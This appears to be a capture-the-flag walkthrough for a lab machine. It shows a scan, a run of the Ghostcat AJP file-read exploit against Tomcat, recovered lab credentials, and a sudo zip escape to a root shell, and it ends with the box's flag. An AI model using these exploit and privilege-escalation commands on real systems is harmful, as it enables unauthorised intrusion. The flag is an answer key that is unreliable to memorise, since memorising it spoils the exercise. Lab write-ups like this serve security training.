
# IP
10.10.223.223
# scan using Nmap
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)

searchsploit tomcat ghostcat
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                                           | multiple/webapps/48143.py




python /usr/share/exploitdb/exploits/multiple/webapps/48143.py -p 8009 -f WEB-INF/web.xml 10.10.223.223


skyfuck:8730281lkjlkjdqlksalks

# After gpg --decrypt need johntheripper to hash the password

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j


run sudo -l to check how to find root
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip


it will run as Zip without passwd



sudo zip ihackpy.zip ihackpy.txt -T --unzip-command="sh -c /bin/bash"


THM{Z1P_1S_FAKE}

#Thank You
